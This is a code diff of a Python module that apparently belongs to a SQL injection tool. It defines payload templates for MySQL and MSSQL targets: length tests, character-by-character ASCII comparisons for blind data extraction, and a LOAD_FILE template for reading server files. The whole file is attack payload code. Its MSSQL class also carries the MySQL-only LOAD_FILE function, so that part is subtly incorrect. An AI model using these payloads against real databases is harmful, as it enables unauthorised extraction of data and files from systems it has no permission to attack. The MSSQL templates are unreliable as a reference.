@@ -1,14 +1,30 @@
 class MysqlPayloads:
 
-    and_size_eq = "AND LENGTH({}) = {}"
-    and_size_lt = "AND LENGTH({}) < {}"
-    and_size_gt = "AND LENGTH({}) > {}"
+    def __init__(self, prefix=''):
+        self.prefix = prefix
 
-    and_char_at_is = "AND ascii(SUBSTRING({}, {},1)) = {}"
-    and_char_at_lt = "AND ascii(SUBSTRING({}, {},1)) < {}"
-    and_char_at_gt = "AND ascii(SUBSTRING({}, {},1)) > {}"
+        self.and_size_eq = self.prefix + " LENGTH({}) = {}"
+        self.and_size_lt = self.prefix + " LENGTH({}) < {}"
+        self.and_size_gt = self.prefix + " LENGTH({}) > {}"
 
-    str_file = "(LOAD_FILE({}))"
+        self.and_char_at_is = self.prefix + " ascii(SUBSTRING({}, {},1)) = {}"
+        self.and_char_at_lt = self.prefix + " ascii(SUBSTRING({}, {},1)) < {}"
+        self.and_char_at_gt = self.prefix + " ascii(SUBSTRING({}, {},1)) > {}"
+
+        self.str_file = "(LOAD_FILE({}))"
 
 
+class MssqlPayloads:
 
+    def __init__(self, prefix=''):
+        self.prefix = prefix
+
+        self.and_size_eq = self.prefix + " LEN({}) = {}"
+        self.and_size_lt = self.prefix + " LEN({}) < {}"
+        self.and_size_gt = self.prefix + " LEN({}) > {}"
+
+        self.and_char_at_is = self.prefix + " ascii(SUBSTRING({}, {},1)) = {}"
+        self.and_char_at_lt = self.prefix + " ascii(SUBSTRING({}, {},1)) < {}"
+        self.and_char_at_gt = self.prefix + " ascii(SUBSTRING({}, {},1)) > {}"
+
+        self.str_file = "(LOAD_FILE({}))"
